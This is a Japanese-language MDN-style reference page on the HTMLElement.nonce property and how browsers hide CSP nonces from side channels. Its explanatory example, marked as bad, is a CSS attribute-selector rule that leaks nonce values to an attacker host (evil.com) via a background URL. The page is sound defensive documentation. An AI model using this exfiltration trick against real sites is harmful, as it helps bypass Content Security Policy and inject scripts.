---
title: HTMLElement.nonce
slug: Web/API/HTMLElement/nonce
tags:
  - API
  - Content Security Policy
  - Experimental
  - HTML DOM
  - HTMLElement
  - プロパティ
  - リファレンス
  - nonce
browser-compat: api.HTMLElement.nonce
translation_of: Web/API/HTMLElement/nonce
original_slug: Web/API/HTMLElement/nonce
---
{{APIRef("HTML DOM")}}

**`nonce`** は {{DOMxRef("HTMLElement")}} インターフェイスのプロパティで、特定の読み取りを続行できるかどうかを決定するためにコンテンツセキュリティポリシー ([Content Security Policy](/ja/docs/Web/HTTP/CSP)) で使用される一度だけの暗号化番号を返します。

後の実装では、 `nonce` 属性を持つ要素はスクリプトにのみ公開します（CSS 属性セレクターのようなサイドチャネルには公開しません）。

## 例

### ノンス値の受け取り

以前は、すべてのブラウザーが IDL 属性の `nonce` に対応している訳ではなかったので、回避策としては、代替として [`getAttribute`](/ja/docs/Web/API/Element/getAttribute) を使用するようにしていました。

```js
let nonce = script['nonce'] || script.getAttribute('nonce');
```

しかし、最近の版のブラウザーでは、この方法でアクセスすると `nonce` の値を隠します（空の文字列が返されます）。 IDL プロパティ (`script['nonce']`) がノンスにアクセスする唯一の方法となります。

ノンスを隠蔽することは、攻撃者が以下のようなコンテンツ属性からデータを取得できるメカニズムを介してノンスデータを流出させることを防ぐのに役立ちます。

```css example-bad
script[nonce~=whatever] {
  background: url("https://evil.com/nonce?whatever");
}
```

## 仕様書

{{Specifications}}

## ブラウザーの互換性

{{Compat}}

## 関連情報

- [`nonce` グローバル属性](/ja/docs/Web/HTML/Global_attributes/nonce)
- [コンテンツセキュリティポリシー](/ja/docs/Web/HTTP/CSP)
- CSP: {{CSP("script-src")}}
